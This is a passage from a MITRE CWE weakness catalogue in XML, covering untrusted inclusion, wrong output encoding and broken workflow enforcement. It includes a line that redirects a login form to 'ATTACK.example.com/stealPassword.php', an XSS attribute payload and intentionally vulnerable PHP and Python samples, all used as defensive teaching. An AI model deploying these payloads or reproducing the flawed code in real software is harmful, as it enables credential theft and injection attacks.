               <Mitigation_Strategy>Identify and Reduce Attack Surface</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Store library, include, and utility files outside of the web document
							root, if possible. Otherwise, store them in a separate directory and use
							the web server's access control capabilities to prevent attackers from
							directly requesting them. One common practice is to define a fixed
							constant in each calling program, then check for the existence of the
							constant in the library/include file; if the constant does not exist,
							then the file was directly requested, and it can exit
							immediately.</Text>
                  <Text>This significantly reduces the chance of an attacker being able to
							bypass any protection mechanisms that are in the base program but not in
							the include files. It will also reduce the attack surface.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-6">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Strategy>Identify and Reduce Attack Surface</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Understand all the potential areas where untrusted inputs can enter
							your software: parameters or arguments, cookies, anything read from the
							network, environment variables, reverse DNS lookups, query results,
							request headers, URL components, e-mail, files, filenames, databases,
							and any external systems that provide data to the application. Remember
							that such inputs may be obtained indirectly through API calls.</Text>
                  <Text>Many file inclusion problems occur because the programmer assumed that
							certain inputs could not be modified, especially for cookies and URL
							components.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-29">
               <Mitigation_Phase>Operation</Mitigation_Phase>
               <Mitigation_Strategy>Firewall</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Use an application firewall that can detect attacks against this
							weakness. It can be beneficial in cases in which the code cannot be
							fixed (because it is controlled by a third party), as an emergency
							prevention measure while more comprehensive software assurance measures
							are applied, or to provide defense in depth.</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness>Moderate</Mitigation_Effectiveness>
               <Mitigation_Effectiveness_Notes>
                  <Text>An application firewall might not cover all possible input vectors. In
							addition, attack techniques might be available to bypass the protection
							mechanism, such as using malformed inputs that can still be processed by
							the component that receives those inputs. Depending on functionality, an
							application firewall might inadvertently reject or modify legitimate
							requests. Finally, some manual effort may be required for
							customization.</Text>
               </Mitigation_Effectiveness_Notes>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-94">
               <Intro_Text>This login webpage includes a weather widget from an external
						website:</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>HTML</Code_Example_Language>
                     <Code>&lt;div class="header"&gt; Welcome!</Code>
                     <Block>
                        <Code>&lt;div id="loginBox"&gt;Please Login:</Code>
                        <Block>
                           <Code>&lt;form id ="loginForm" name="loginForm"
										action="login.php" method="post"&gt;</Code>
                           <Code>Username: &lt;input type="text" name="username"
										/&gt;</Code>
                           <Code>&lt;br/&gt;</Code>
                           <Code>Password: &lt;input type="password" name="password"
										/&gt;</Code>
                           <Code>&lt;input type="submit" value="Login" /&gt;</Code>
                           <Code>&lt;/form&gt;</Code>
                        </Block>
                        <Code>&lt;/div&gt;</Code>
                        <Code>&lt;div id="WeatherWidget"&gt;</Code>
                        <Block>
                           <Code>&lt;script type="text/javascript"
										src="externalDomain.example.com/weatherwidget.js"&gt;&lt;/script&gt;</Code>
                        </Block>
                        <Code>&lt;/div&gt;</Code>
                     </Block>
                     <Code>&lt;/div&gt;</Code>
                  </Block>
                  <Text>This webpage is now only as secure as the external domain it is
							including functionality from. If an attacker compromised the external
							domain and could add malicious scripts to the weatherwidget.js file, the
							attacker would have complete control, as seen in any XSS weakness
							(CWE-79).</Text>
                  <Text>For example, user login information could easily be stolen with a
							single line added to weatherwidget.js: </Text>
                  <Block Block_Nature="Attack">
                     <Code_Example_Language>Javascript</Code_Example_Language>
                     <Comment>...Weather widget code....</Comment>
                     <Code>document.getElementById('loginForm').action =
								"ATTACK.example.com/stealPassword.php";</Code>
                  </Block>
                  <Text>This line of javascript changes the login form's original action
							target from the original website to an attack site. As a result, if a
							user attempts to login their username and password will be sent directly
							to the attack site.</Text>
               </Example_Body>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2010-2076</Observed_Example_Reference>
               <Observed_Example_Description>Product does not properly reject DTDs in SOAP
						messages, which allows remote attackers to read arbitrary files, send HTTP
						requests to intranet servers, or cause a denial of service.
					</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2004-0285</Observed_Example_Reference>
               <Observed_Example_Description>Modification of assumed-immutable configuration
						variable in include file allows file inclusion via direct
						request.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2004-0030</Observed_Example_Reference>
               <Observed_Example_Description>Modification of assumed-immutable configuration
						variable in include file allows file inclusion via direct
						request.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2004-0068</Observed_Example_Reference>
               <Observed_Example_Description>Modification of assumed-immutable configuration
						variable in include file allows file inclusion via direct
						request.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2005-2157</Observed_Example_Reference>
               <Observed_Example_Description>Modification of assumed-immutable configuration
						variable in include file allows file inclusion via direct
						request.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2005-2162</Observed_Example_Reference>
               <Observed_Example_Description>Modification of assumed-immutable configuration
						variable in include file allows file inclusion via direct
						request.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2005-2198</Observed_Example_Reference>
               <Observed_Example_Description>Modification of assumed-immutable configuration
						variable in include file allows file inclusion via direct
						request.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2004-0128</Observed_Example_Reference>
               <Observed_Example_Description>Modification of assumed-immutable variable in
						configuration script leads to file inclusion.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2005-1864</Observed_Example_Reference>
               <Observed_Example_Description>PHP file inclusion.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2005-1869</Observed_Example_Reference>
               <Observed_Example_Description>PHP file inclusion.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2005-1870</Observed_Example_Reference>
               <Observed_Example_Description>PHP file inclusion.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2005-2154</Observed_Example_Reference>
               <Observed_Example_Description>PHP local file
						inclusion.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2002-1704</Observed_Example_Reference>
               <Observed_Example_Description>PHP remote file
						include.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2002-1707</Observed_Example_Reference>
               <Observed_Example_Description>PHP remote file
						include.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2005-1964</Observed_Example_Reference>
               <Observed_Example_Description>PHP remote file
						include.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2005-1681</Observed_Example_Reference>
               <Observed_Example_Description>PHP remote file
						include.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2005-2086</Observed_Example_Reference>
               <Observed_Example_Description>PHP remote file
						include.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2004-0127</Observed_Example_Reference>
               <Observed_Example_Description>Directory traversal vulnerability in PHP include
						statement.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2005-1971</Observed_Example_Reference>
               <Observed_Example_Description>Directory traversal vulnerability in PHP include
						statement.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2005-3335</Observed_Example_Reference>
               <Observed_Example_Description>PHP file inclusion issue, both remote and local;
						local include uses ".." and "%00" characters as a manipulation, but many
						remote file inclusion issues probably have this
						vector.</Observed_Example_Description>
            </Observed_Example>
         </Observed_Examples>
         <References>
            <Reference Reference_ID="REF-21" Local_Reference_ID="R.829.1">
               <Reference_Author>OWASP</Reference_Author>
               <Reference_Title>OWASP Enterprise Security API (ESAPI) Project</Reference_Title>
               <Reference_Link>http://www.owasp.org/index.php/ESAPI</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-31" Local_Reference_ID="R.829.2">
               <Reference_Author>Sean Barnum</Reference_Author>
               <Reference_Author>Michael Gegick</Reference_Author>
               <Reference_Title>Least Privilege</Reference_Title>
               <Reference_PubDate>2005-09-14</Reference_PubDate>
               <Reference_Link>https://buildsecurityin.us-cert.gov/daisy/bsi/articles/knowledge/principles/351.html</Reference_Link>
            </Reference>
         </References>
         <Content_History>
            <Submission Submission_Source="Internal_CWE_Team">
               <Submitter_Organization>MITRE</Submitter_Organization>
               <Submission_Date>2010-11-29</Submission_Date>
            </Submission>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples,
						Observed_Examples, Potential_Mitigations, Related_Attack_Patterns,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, References,
						Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
         </Content_History>
      </Weakness>
                    <Weakness ID="838" Name="Inappropriate Encoding for Output Context" Weakness_Abstraction="Base" Status="Incomplete">
         <Description>
            <Description_Summary>The software uses or specifies an encoding when generating
					output to a downstream component, but the specified encoding is not the same as
					the encoding that is expected by the downstream component.</Description_Summary>
            <Extended_Description>
               <Text>This weakness can cause the downstream component to use a decoding method
						that produces different data than what the software intended to send. When
						the wrong encoding is used - even if closely related - the downstream
						component could decode the data incorrectly. This can have security
						consequences when the provided boundaries between control and data are
						inadvertently broken, because the resulting data could introduce control
						characters or special elements that were not sent by the software. The
						resulting data could then be used to bypass protection mechanisms such as
						input validation, and enable injection attacks.</Text>
               <Text> While using output encoding is essential for ensuring that communications
						between components are accurate, the use of the wrong encoding - even if
						closely related - could cause the downstream component to misinterpret the
						output. </Text>
               <Text>For example, HTML entity encoding is used for elements in the HTML body of
						a web page. However, a programmer might use entity encoding when generating
						output for that is used within an attribute of an HTML tag, which could
						contain functional Javascript that is not affected by the HTML
						encoding.</Text>
               <Text>While web applications have received the most attention for this problem,
						this weakness could potentially apply to any type of software that uses a
						communications stream that could support multiple encodings.</Text>
            </Extended_Description>
         </Description>
         <Relationships>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">900</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>867</Relationship_Target_ID>
               <!--2011 Top 25 - Weaknesses On the Cusp--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">1000</Relationship_View_ID>
                  <Relationship_View_ID Ordinal="Primary">699</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>116</Relationship_Target_ID>
               <!--Improper Encoding or Escaping of Output--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">844</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>845</Relationship_Target_ID>
               <!--CERT Java Secure Coding Section 00 - Input Validation and Data Sanitization (IDS)--></Relationship>
         </Relationships>
         <Applicable_Platforms>
            <Languages>
               <Language_Class Language_Class_Description="Language-independent"/>
            </Languages>
         </Applicable_Platforms>
         <Common_Consequences>
            <Common_Consequence>
               <Consequence_Scope>Integrity</Consequence_Scope>
               <Consequence_Scope>Confidentiality</Consequence_Scope>
               <Consequence_Scope>Availability</Consequence_Scope>
               <Consequence_Technical_Impact>Modify application
						data</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Execute unauthorized code or
						commands</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>An attacker could modify the structure of the message or data being
							sent to the downstream component, possibly injecting commands.</Text>
               </Consequence_Note>
            </Common_Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Strategy>Output Encoding</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Use context-aware encoding. That is, understand which encoding is
							being used by the downstream component, and ensure that this encoding is
							used. If an encoding can be specified, do so, instead of assuming that
							the default encoding is the same as the default being assumed by the
							downstream component.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Strategy>Output Encoding</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Where possible, use communications protocols or data formats that
							provide strict boundaries between control and data. If this is not
							feasible, ensure that the protocols or formats allow the communicating
							components to explicitly state which encoding/decoding method is being
							used. Some template frameworks provide built-in support.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-4.3">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Strategy>Libraries or Frameworks</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Use a vetted library or framework that does not allow this weakness to
							occur or provides constructs that make this weakness easier to
							avoid.</Text>
                  <Text>For example, consider using the ESAPI Encoding control [R.838.7] or a
							similar tool, library, or framework. These will help the programmer
							encode outputs in a manner less prone to error.</Text>
                  <Text>Note that some template mechanisms provide built-in support for the
							appropriate encoding.</Text>
               </Mitigation_Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text> This code dynamically builds an HTML page using POST data: </Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>PHP</Code_Example_Language>
                     <Code>$username = $_POST['username'];</Code>
                     <Code>$picSource = $_POST['picsource'];</Code>
                     <Code>$picAltText = $_POST['picalttext'];</Code>
                     <Comment>...</Comment>
                     <Code>echo "&lt;title&gt;Welcome, " . htmlentities($username)
								."&lt;/title&gt;";</Code>
                     <Code>echo "&lt;img src='". htmlentities($picSource) ." ' alt='".
								htmlentities($picAltText) . '" /&gt;';</Code>
                     <Comment>...</Comment>
                  </Block>
                  <Text> The programmer attempts to avoid XSS exploits (CWE-79) by encoding
							the POST values so they will not be interpreted as valid HTML. However,
							the htmlentities() encoding is not appropriate when the data are used as
							HTML attributes, allowing more attributes to be injected. </Text>
                  <Text>For example, an attacker can set picAltText to:</Text>
                  <Block Block_Nature="Attack">
                     <Code>"altTextHere' onload='alert(document.cookie)"</Code>
                  </Block>
                  <Text>This will result in the generated HTML image tag:</Text>
                  <Block Block_Nature="Result">
                     <Code_Example_Language>HTML</Code_Example_Language>
                     <Code>&lt;img src='pic.jpg' alt='altTextHere'
								onload='alert(document.cookie)' /&gt; </Code>
                  </Block>
                  <Text>The attacker can inject arbitrary javascript into the tag due to this
							incorrect encoding.</Text>
               </Example_Body>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-2814</Observed_Example_Reference>
               <Observed_Example_Description>Server does not properly handle requests that do
						not contain UTF-8 data; browser assumes UTF-8, allowing
						XSS.</Observed_Example_Description>
            </Observed_Example>
         </Observed_Examples>
         <References>
            <Reference Local_Reference_ID="R.838.1">
               <Reference_Author>Jim Manico</Reference_Author>
               <Reference_Title>Injection-safe templating languages</Reference_Title>
               <Reference_Date>2010-06-30</Reference_Date>
               <Reference_Link>http://manicode.blogspot.com/2010/06/injection-safe-templating-languages_30.html</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.838.2">
               <Reference_Author>Dinis Cruz</Reference_Author>
               <Reference_Title>Can we please stop saying that XSS is boring and easy to
						fix!</Reference_Title>
               <Reference_Date>2010-09-25</Reference_Date>
               <Reference_Link>http://diniscruz.blogspot.com/2010/09/can-we-please-stop-saying-that-xss-is.html</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.838.3">
               <Reference_Author>Ivan Ristic</Reference_Author>
               <Reference_Title>Canoe: XSS prevention via context-aware output
						encoding</Reference_Title>
               <Reference_Date>2010-09-24</Reference_Date>
               <Reference_Link>http://blog.ivanristic.com/2010/09/introducing-canoe-context-aware-output-encoding-for-xss-prevention.html</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.838.4">
               <Reference_Author>Jim Manico</Reference_Author>
               <Reference_Title>What is the Future of Automated XSS Defense
						Tools?</Reference_Title>
               <Reference_Date>2011-03-08</Reference_Date>
               <Reference_Link>http://software-security.sans.org/downloads/appsec-2011-files/manico-appsec-future-tools.pdf</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-15" Local_Reference_ID="R.838.5">
               <Reference_Author>Jeremiah Grossman</Reference_Author>
               <Reference_Author>Robert "RSnake" Hansen</Reference_Author>
               <Reference_Author>Petko "pdp" D. Petkov</Reference_Author>
               <Reference_Author>Anton Rager</Reference_Author>
               <Reference_Author>Seth Fogie</Reference_Author>
               <Reference_Title>XSS Attacks</Reference_Title>
               <Reference_Section>Preventing XSS Attacks</Reference_Section>
               <Reference_Publisher>Syngress</Reference_Publisher>
               <Reference_PubDate>2007</Reference_PubDate>
            </Reference>
            <Reference Reference_ID="REF-20" Local_Reference_ID="R.838.6">
               <Reference_Author>OWASP</Reference_Author>
               <Reference_Title>DOM based XSS Prevention Cheat Sheet</Reference_Title>
               <Reference_Link>http://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-21" Local_Reference_ID="R.838.7">
               <Reference_Author>OWASP</Reference_Author>
               <Reference_Title>OWASP Enterprise Security API (ESAPI) Project</Reference_Title>
               <Reference_Link>http://www.owasp.org/index.php/ESAPI</Reference_Link>
            </Reference>
         </References>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT Java Secure Coding">
               <Mapped_Node_Name>Perform lossless conversion of String data between differing
						character encodings</Mapped_Node_Name>
               <Mapped_Node_ID>IDS12-J</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT Java Secure Coding">
               <Mapped_Node_Name>Use compatible encodings on both sides of file or network
						IO</Mapped_Node_Name>
               <Mapped_Node_ID>IDS13-J</Mapped_Node_ID>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>468</CAPEC_ID>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Content_History>
            <Submission Submission_Source="Internal_CWE_Team">
               <Submitter_Organization>MITRE</Submitter_Organization>
               <Submission_Date>2011-03-24</Submission_Date>
            </Submission>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Related_Attack_Patterns,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References, Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
         </Content_History>
      </Weakness>
                    <Weakness ID="841" Name="Improper Enforcement of Behavioral Workflow" Weakness_Abstraction="Base" Status="Incomplete">
         <Description>
            <Description_Summary>The software supports a session in which more than one behavior
					must be performed by an actor, but it does not properly ensure that the actor
					performs the behaviors in the required sequence.</Description_Summary>
            <Extended_Description>
               <Text>By performing actions in an unexpected order, or by omitting steps, an
						attacker could manipulate the business logic of the software or cause it to
						enter an invalid state. In some cases, this can also expose resultant
						weaknesses.</Text>
               <Text>For example, a file-sharing protocol might require that an actor perform
						separate steps to provide a username, then a password, before being able to
						transfer files. If the file-sharing server accepts a password command
						followed by a transfer command, without any username being provided, the
						software might still perform the transfer.</Text>
               <Text>Note that this is different than CWE-696, which focuses on when the
						software performs actions in the wrong sequence; this entry is closely
						related, but it is focused on ensuring that the actor performs actions in
						the correct sequence. </Text>
               <Text>Workflow-related behaviors include:</Text>
               <Block Block_Nature="List">
                  <Text>Steps are performed in the expected order.</Text>
                  <Text>Required steps are not omitted.</Text>
                  <Text>Steps are not interrupted.</Text>
                  <Text>Steps are performed in a timely fashion.</Text>
               </Block>
            </Extended_Description>
         </Description>
         <Relationships>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">900</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>867</Relationship_Target_ID>
               <!--2011 Top 25 - Weaknesses On the Cusp--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>691</Relationship_Target_ID>
               <!--Insufficient Control Flow Management--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">699</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>840</Relationship_Target_ID>
               <!--Business Logic Errors--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>699</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>438</Relationship_Target_ID>
               <!--Behavioral Problems--></Relationship>
         </Relationships>
         <Common_Consequences>
            <Common_Consequence>
               <Consequence_Scope>Other</Consequence_Scope>
               <Consequence_Technical_Impact>Alter execution
						logic</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>An attacker could cause the software to skip critical steps or perform
							them in the wrong order, bypassing its intended business logic. This can
							sometimes have security implications.</Text>
               </Consequence_Note>
            </Common_Consequence>
         </Common_Consequences>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>This code is part of an FTP server and deals with various commands
						that could be sent by a user. It is intended that a user must successfully
						login before performing any other action such as retrieving or listing
						files.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Python</Code_Example_Language>
                     <Code>def dispatchCommand(command, user, args):</Code>
                     <Block>
                        <Code>if command == 'Login':</Code>
                        <Block>
                           <Code>loginUser(args)</Code>
                           <Code>return</Code>
                        </Block>
                        <Comment># user has requested a file</Comment>
                        <Code>if command == 'Retrieve_file':</Code>
                        <Block>
                           <Code>if authenticated(user) and ownsFile(user,args):</Code>
                           <Code>sendFile(args)</Code>
                           <Code>return</Code>
                        </Block>
                        <Code>if command == 'List_files':</Code>
                        <Block>
                           <Code>listFiles(args)</Code>
                           <Code>return</Code>
                        </Block>
                        <Comment>...</Comment>
                     </Block>
                  </Block>
                  <Text> The server correctly does not send files to a user that isn't logged
							in and doesnt own the file. However, the server will incorrectly list
							the files in any directory without confirming the command came from an
							authenticated user, and that the user is authorized to see the
							directory's contents. </Text>
                  <Text>Here is a fixed version of the above example:</Text>
                  <Block Block_Nature="Good_Code">
                     <Code_Example_Language>Python</Code_Example_Language>
                     <Code>def dispatchCommand(command, user, args):</Code>
                     <Block>
                        <Comment>...</Comment>
                        <Code>if command == 'List_files':</Code>
                        <Block>
                           <Code>if authenticated(user) and
										ownsDirectory(user,args):</Code>
                           <Block>
                              <Code>listFiles(args)</Code>
                              <Code>return</Code>
                           </Block>
                        </Block>
                        <Comment>...</Comment>
                     </Block>
                  </Block>
               </Example_Body>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2011-0348</Observed_Example_Reference>
               <Observed_Example_Description>Bypass of access/billing restrictions by sending
						traffic to an unrestricted destination before sending to a restricted
						destination.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2007-3012</Observed_Example_Reference>
               <Observed_Example_Description>Attacker can access portions of a restricted page
						by canceling out of a dialog.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-5056</Observed_Example_Reference>
               <Observed_Example_Description>Ticket-tracking system does not enforce a
						permission setting.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2004-2164</Observed_Example_Reference>
               <Observed_Example_Description>Shopping cart does not close a database connection
						when user restores a previous order, leading to connection
						exhaustion.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2003-0777</Observed_Example_Reference>
               <Observed_Example_Description>Chain: product does not properly handle dropped
						connections, leading to missing NULL terminator (CWE-170) and segmentation
						fault.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2005-3327</Observed_Example_Reference>
               <Observed_Example_Description>Chain: Authentication bypass by skipping the first
						startup step as required by the protocol.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2004-0829</Observed_Example_Reference>
               <Observed_Example_Description>Chain: File server crashes when sent a "find next"
						request without an initial "find first."</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2010-2620</Observed_Example_Reference>
               <Observed_Example_Description> FTP server allows remote attackers to bypass
						authentication by sending (1) LIST, (2) RETR, (3) STOR, or other commands
						without performing the required login steps first.
					</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2005-3296</Observed_Example_Reference>
               <Observed_Example_Description>FTP server allows remote attackers to list
						arbitrary directories as root by running the LIST command before logging in.
					</Observed_Example_Description>
            </Observed_Example>
         </Observed_Examples>
         <Research_Gaps>
            <Research_Gap>
               <Text>This weakness is typically associated with business logic flaws, except
						when it produces resultant weaknesses.</Text>
               <Text>The classification of business logic flaws has been under-studied,
						although exploitation of business flaws frequently happens in real-world
						systems, and many applied vulnerability researchers investigate them. The
						greatest focus is in web applications. There is debate within the community
						about whether these problems represent particularly new concepts, or if they
						are variations of well-known principles. </Text>
               <Text>Many business logic flaws appear to be oriented toward business processes,
						application flows, and sequences of behaviors, which are not as
						well-represented in CWE as weaknesses related to input validation, memory
						management, etc.</Text>
            </Research_Gap>
         </Research_Gaps>
         <References>
            <Reference>
               <Reference_Author>Jeremiah Grossman</Reference_Author>
               <Reference_Title>Business Logic Flaws and Yahoo Games</Reference_Title>
               <Reference_Date>2006-12-08</Reference_Date>
               <Reference_PubDate>October 2007</Reference_PubDate>
               <Reference_Link>http://jeremiahgrossman.blogspot.com/2006/12/business-logic-flaws.html</Reference_Link>
            </Reference>
            <Reference>
               <Reference_Author>Jeremiah Grossman</Reference_Author>
               <Reference_Title>Seven Business Logic Flaws That Put Your Website At
						Risk</Reference_Title>
               <Reference_PubDate>October 2007</Reference_PubDate>
               <Reference_Link>http://www.whitehatsec.com/home/assets/WP_bizlogic092407.pdf</Reference_Link>
            </Reference>
            <Reference>
               <Reference_Author>WhiteHat Security</Reference_Author>
               <Reference_Title>Business Logic Flaws</Reference_Title>
